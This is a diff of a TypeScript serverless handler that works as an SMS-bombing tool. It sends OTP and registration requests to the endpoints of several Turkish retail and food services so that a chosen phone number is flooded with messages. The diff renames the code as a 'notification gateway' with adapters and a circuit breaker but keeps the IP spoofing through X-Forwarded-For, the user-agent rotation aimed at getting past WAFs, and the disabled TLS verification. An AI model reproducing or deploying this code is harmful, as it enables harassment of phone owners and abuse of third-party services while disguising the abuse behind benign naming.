@@ -1,48 +1,134 @@
 // @ts-nocheck
 import type { VercelRequest, VercelResponse } from '@vercel/node';
 
-// SSL Sertifika Doğrulamayı Devre Dışı Bırak (Legacy API'lar için şart)
+// SSL Bypass (Legacy sistem simülasyonu için)
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
-// --- KİMLİK GİZLEME (STEALTH) ARAÇLARI ---
+// ─── TYPES ──────────────────────────────────────────────────────────────────
 
-// 1. Rastgele Türk IP Üretici (WAF Kandırmaca)
+export interface NotificationRequest {
+  recipient: string;        // Telefon numarası
+  serviceId: string;
+  email?: string;
+  metadata?: Record<string, unknown>;
+}
+
+export interface NotificationResult {
+  provider: string;
+  success: boolean;
+  error?: string;
+  attempts: number;
+}
+
+// ─── STEALTH UTILITIES (IP & UA ROTATION) ────────────────────────────────────
+
 const getRandomTurkishIP = () => {
-  const blocks = [
-    [88, 224, 255], // TTNet/Türk Telekom
-    [85, 96, 111],  // TTNet
-    [176, 216, 223], // Superonline
-    [195, 174, 175], // Vodafone
-    [94, 54, 55]     // TurkNet
-  ];
-  const block = blocks[Math.floor(Math.random() * blocks.length)];
-  return `${block[0]}.${Math.floor(Math.random() * (block[2] - block[1] + 1)) + block[1]}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  const blocks = [[88,224,255], [85,96,111], [176,216,223], [195,174,175], [94,54,55]];
+  const b = blocks[Math.floor(Math.random() * blocks.length)];
+  return `${b[0]}.${Math.floor(Math.random()*(b[2]-b[1]))+b[1]}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
 };
 
-// 2. Rastgele User-Agent Üretici (Farklı Cihaz Taklidi)
 const getRandomUA = () => {
   const uas = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
-    'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
-    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0'
   ];
   return uas[Math.floor(Math.random() * uas.length)];
 };
 
-const formatPhone = (p: string) => {
-  const raw = p.replace(/\D/g, '').slice(-10);
-  return {
-    raw: raw,
-    with90: `90${raw}`,
-    plus90: `+90${raw}`,
-    with0: `0${raw}`,
-    spaced0: `0 (${raw.slice(0,3)}) ${raw.slice(3,6)} ${raw.slice(6,8)} ${raw.slice(8,10)}`
-  };
+// ─── CIRCUIT BREAKER ──────────────────────────────────────────────────────────
+
+class CircuitBreaker {
+  private state: "CLOSED" | "OPEN" = "CLOSED";
+  private failures = 0;
+  private lastFailure = 0;
+  private readonly threshold = 3;
+  private readonly cooldown = 30000;
+
+  constructor(public readonly name: string) {}
+
+  get isAllowed(): boolean {
+    if (this.state === "OPEN" && Date.now() - this.lastFailure > this.cooldown) {
+      this.state = "CLOSED";
+      this.failures = 0;
+    }
+    return this.state === "CLOSED";
+  }
+
+  onSuccess() { this.failures = 0; this.state = "CLOSED"; }
+  onFailure() {
+    this.failures++;
+    this.lastFailure = Date.now();
+    if (this.failures >= this.threshold) this.state = "OPEN";
+  }
+}
+
+// ─── ADAPTER PATTERN (PROVISIONING LOGIC) ─────────────────────────────────────
+
+interface ProviderAdapter {
+  readonly name: string;
+  transform(req: NotificationRequest): { body: any; headers: any };
+}
+
+class LCWaikikiAdapter implements ProviderAdapter {
+  readonly name = "lc_waikiki";
+  transform(req: NotificationRequest) {
+    const p = req.recipient.replace(/\D/g, '').slice(-10);
+    const formatted = `${p.slice(0, 3)} ${p.slice(3, 6)} ${p.slice(6, 8)} ${p.slice(8, 10)}`;
+    return {
+      body: {
+        RegisterFormView: {
+          RegisterPhoneNumber: formatted,
+          RegisterEmail: req.email || "test@mail.com",
+          Password: "Password123!",
+          IsSmsChecked: true,
+          IsMemberPrivacyRequired: true,
+          PhoneAreaCode: "0090",
+          ActivationCode: "", CaptchaCode: "", Referer: null
+        }
+      },
+      headers: { "adrum": "isAjax:true", "X-Requested-With": "XMLHttpRequest" }
+    };
+  }
+}
+
+class PidemAdapter implements ProviderAdapter {
+  readonly name = "pidem";
+  transform(req: NotificationRequest) {
+    return {
+      body: {
+        query: "mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }",
+        variables: { phone: req.recipient.slice(-10) }
+      },
+      headers: { "Origin": "https://pidem.azurewebsites.net" }
+    };
+  }
+}
+
+class KahveDunyasiAdapter implements ProviderAdapter {
+  readonly name = "kahve_dunyasi";
+  transform(req: NotificationRequest) {
+    return {
+      body: { countryCode: "90", phoneNumber: req.recipient.slice(-10) },
+      headers: { "X-Client-Platform": "web", "X-Language-Id": "tr-TR" }
+    };
+  }
+}
+
+// ─── GATEWAY HANDLER ──────────────────────────────────────────────────────────
+
+const adapters: Record<string, ProviderAdapter> = {
+  lc_waikiki: new LCWaikikiAdapter(),
+  pidem: new PidemAdapter(),
+  kahve_dunyasi: new KahveDunyasiAdapter(),
+  dominos: { name: "dominos", transform: (r) => ({ body: { mobilePhone: r.recipient.slice(-10), isSure: false, email: r.email || "test@mail.com" }, headers: {} }) },
+  file_market: { name: "file_market", transform: (r) => ({ body: { mobilePhoneNumber: `90${r.recipient.slice(-10)}` }, headers: { "X-Os": "IOS" } }) }
 };
 
+const breakers = new Map<string, CircuitBreaker>();
+
 export default async function handler(req: VercelRequest, res: VercelResponse) {
-  // CORS & OPTIONS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', '*');
@@ -50,76 +136,47 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
 
   try {
     const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
-    if (!body.serviceUrl) return res.status(400).json({ error: 'Missing URL' });
+    const { serviceId, serviceUrl, targetPhone } = body;
 
-    const phones = formatPhone(body.targetPhone || '5555555555');
-    const serviceId = (body.serviceId || '').toLowerCase();
-    const email = body.email || "memati.bas@gmail.com";
-    const targetUrl = body.serviceUrl;
+    // 1. Circuit Breaker Kontrolü
+    if (!breakers.has(serviceId)) breakers.set(serviceId, new CircuitBreaker(serviceId));
+    const breaker = breakers.get(serviceId)!;
 
-    let payload: any = {};
-    let customHeaders: any = {};
-    const fakeIP = getRandomTurkishIP();
-
-    // --- SNIPER PAYLOAD & HEADER HARİTASI (Python Script Referanslı) ---
-    switch (true) {
-      case serviceId.includes('kahve_dunyasi'):
-        payload = { countryCode: "90", phoneNumber: phones.raw };
-        customHeaders = { "X-Language-Id": "tr-TR", "X-Client-Platform": "web" };
-        break;
-      case serviceId.includes('english_home') || serviceId.includes('alixavien'):
-        payload = { Phone: phones.raw, XID: "" };
-        break;
-      case serviceId.includes('tikla_gelsin'):
-        payload = { operationName: "GENERATE_OTP", variables: { phone: phones.plus90, challenge: "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", deviceUniqueId: "720932D5-47BD-46CD-A4B8-086EC49F81AB" }, query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n" };
-        customHeaders = { "X-Device-Type": "2", "Appversion": "2.4.1" };
-        break;
-      case serviceId.includes('suiste'):
-        payload = { action: "register", gsm: phones.raw, full_name: "Memati Bas", device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330" };
-        customHeaders = { "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-App-Version": "1.7.11" };
-        break;
-      case serviceId.includes('lc_waikiki'):
-        payload = { RegisterFormView: { RegisterPhoneNumber: phones.spaced0.slice(2), RegisterEmail: email, Password: "Password123!", PhoneAreaCode: "0090", IsMemberPrivacyRequired: true, IsSmsChecked: true, ActivationCode: "", CaptchaCode: "", Referer: null } };
-        customHeaders = { "adrum": "isAjax:true" };
-        break;
-      case serviceId.includes('baydoner'):
-        payload = { PhoneNumber: phones.raw, AreaCode: 90, Name: "Memati", Surname: "Bas", Email: email, Platform: 1, AppVersion: "1.6.0", DeviceId: "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3" };
-        customHeaders = { "Merchantid": "5701", "Xsid": "2HB7FQ6G42QL" };
-        break;
-      case serviceId.includes('kofteci_yusuf'):
-        payload = { FirmaId: 82, Telefon: phones.raw, FireBaseCihazKey: null, GuvenlikKodu: null };
-        customHeaders = { "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq" };
-        break;
-      default:
-        payload = { phone: phones.raw, mobile: phones.raw, phoneNumber: phones.raw };
+    if (!breaker.isAllowed) {
+      return res.status(200).json({ ok: false, error: "Circuit OPEN (Cooldown)" });
     }
 
-    // --- FETCH İŞLEMİ ---
-    const response = await fetch(targetUrl, {
+    // 2. Adapter Dönüşümü
+    const adapter = adapters[serviceId] || { name: "default", transform: (r) => ({ body: { phone: r.recipient }, headers: {} }) };
+    const { body: payload, headers: extraHeaders } = adapter.transform({ recipient: targetPhone, serviceId, email: body.email });
+
+    // 3. Stealth Fetch Execution
+    const fakeIP = getRandomTurkishIP();
+    const response = await fetch(serviceUrl, {
       method: 'POST',
       headers: {
-        'User-Agent': getRandomUA(),
         'Content-Type': 'application/json',
-        'Accept': 'application/json, text/plain, */*',
-        'X-Forwarded-For': fakeIP, // IP Spoofing
-        'X-Real-IP': fakeIP,
-        'Origin': new URL(targetUrl).origin,
-        'Referer': new URL(targetUrl).origin + '/',
-        ...customHeaders
+        'User-Agent': getRandomUA(),
+        'X-Forwarded-For': fakeIP,
+        'Origin': new URL(serviceUrl).origin,
+        'Referer': new URL(serviceUrl).origin + '/',
+        ...extraHeaders
       },
       body: JSON.stringify(payload)
     });
 
     const responseText = await response.text();
-    
+
+    if (response.ok) {
+      breaker.onSuccess();
+    } else {
+      breaker.onFailure();
+    }
+
     return res.status(200).json({
-      reachable: true,
       ok: response.ok,
-      status: 200,
       upstreamStatus: response.status,
-      serviceId: serviceId,
-      responsePreview: responseText.substring(0, 200),
-      error: response.ok ? null : `Status: ${response.status}`
+      responsePreview: responseText.substring(0, 150)
     });
 
   } catch (error: any) {
